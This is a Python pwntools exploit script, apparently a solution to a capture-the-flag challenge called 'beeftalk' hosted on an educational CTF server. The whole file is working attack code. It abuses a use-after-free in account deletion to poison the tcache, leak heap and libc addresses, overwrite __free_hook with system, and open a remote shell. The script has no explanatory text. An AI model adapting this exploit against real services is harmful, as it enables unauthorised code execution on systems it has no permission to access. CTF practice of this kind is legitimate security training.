from pwn import *

# Context Setting
context.terminal = ["tmux", "splitw", "-h", "-l", "105"]
# context.log_level = "debug"

# GDB Debug Script
GDB_INIT = """
    b signup
    b delete_account
    b update_user
"""

# Process
# r = process("./beeftalk/share/beeftalk")
# legit_user = process("./beeftalk/share/beeftalk")
r = remote("edu-ctf.zoolab.org", 30207)

# Tokens
r_tokens = []
legit_user_token = None

# Communicator
def signup(tube, name: bytes, desc: bytes, job: bytes, money: int=1000):
    tube.sendlineafter(b"> ", str(2).encode())

    tube.sendlineafter(b"What's your name ?\n> ", name)
    tube.sendlineafter(b"What's your desc ?\n> ", desc)
    tube.sendlineafter(b"What's your job ?\n> ", job)
    tube.sendlineafter(b"How much money do you have ?\n> ", str(money).encode())

    tube.sendlineafter(b"Is correct ?\n(y/n) > ", b"y")
    tube.recvuntil(b"Done! This is your login token: ")
    token = tube.recvline().decode()

    info(f"[CMD]: Signup user {name[:10]} ({desc}, {job}, {money}). With return Token: {token}")

    return token

def login(tube, token: str):
    tube.sendlineafter(b"> ", str(1).encode())
    tube.sendlineafter(b"Give me your token: \n> ", token.encode())

    info(f"[CMD]: Login user: {token}")

def logout(tube):
    tube.sendlineafter(b"> ", str(4).encode())

def delete_account(tube, token: str):
    tube.sendlineafter(b"> ", str(3).encode())
    tube.sendlineafter(b"Are you sure ?\n(y/n) > ", b"y")

    info(f"[CMD]: Delete user: {token}")

def update_user(tube, name: bytes, desc: bytes, job: bytes, money: int=1000):
    tube.sendlineafter(b"> ", str(1).encode())

    tube.sendlineafter(b"Name: \n> ", name)
    tube.sendlineafter(b"Desc: \n> ", desc)
    tube.sendlineafter(b"Job: \n> ", job)
    tube.sendlineafter(b"Money: \n> ", str(money).encode())

def chat(tube, target_room: str=""):
    tube.sendlineafter(b"> ", str(2).encode())
    tube.recvuntil(b"Connect to room with token ?\n(y/n) > ")
    if len(target_room):
        tube.send(b"y")
        tube.sendlineafter(b"Connection token: \n> ", target_room.encode())
    else:
        tube.send(b"n")

# Initialize Legit User
# legit_user_token = signup(legit_user, "User", "User", "User")

# Place Blocks in Unsorted Bin
# Create 8 Users
for i in range(8):
    r_tokens.append(signup(r, b'A'*0x80, b"PWN", b"SEC"))

# Login and Delete
# This Part should be reverse, cause consolidation problem
for i in range(8):
    login(r, r_tokens[7-i])
    delete_account(r, r_tokens[7-i])

# Leak Heap Address
login(r, r_tokens[6])
r.recvuntil(b"Hello ")
BASE_HEAP = u64(r.recv(6).ljust(8, b'\x00')) - 0xea0

info("[LEAK]: Heap Base Address: " + hex(BASE_HEAP))
logout(r)

# Leak Libc Based Address
# Change Tcache Chain Chunk Sequence
r_tokens[0] = signup(r, b'A'*0x80, b"PWN", b"SEC")
login(r, r_tokens[0])
delete_account(r, r_tokens[0])

login(r, r_tokens[0])
update_user(r, p64(BASE_HEAP+0x3f0), b"PWN", p64(BASE_HEAP + 0x6d0))
logout(r)

login(r, r_tokens[5])
r.recvuntil(b"Hello ")
BASE_LIBC = u64(r.recv(6).ljust(8, b'\x00')) - 0x1ebbe0
logout(r)

info("[LEAK]: Libc Base Address: " + hex(BASE_LIBC))

ADDR_SYSTEM = BASE_LIBC + 0x55410
ADDR_FREE_HOOK = BASE_LIBC + 0x1eeb28

# Write FREELIBC
login(r, r_tokens[0])
update_user(r, p64(ADDR_FREE_HOOK), b"PWN", p64(BASE_HEAP + 0x6d0))
logout(r)

login(r, r_tokens[5])
update_user(r, p64(ADDR_SYSTEM), b"PWN", p64(BASE_HEAP + 0xd90))
logout(r)

# Restore Chain
login(r, r_tokens[0])
update_user(r, p64(BASE_HEAP+0xb90), b"PWN", p64(BASE_HEAP + 0x6d0))
logout(r)

info("[HIJACK]: __free_hook had been hijack to system!")

r_tokens[0] = signup(r, b"/bin/sh", b"PWN", b"SEC")
login(r, r_tokens[0])
delete_account(r, r_tokens[0])

# r.sendlineafter(b"> ", str(3).encode())
# legit_user.sendlineafter(b"> ", str(3).encode())
r.interactive()
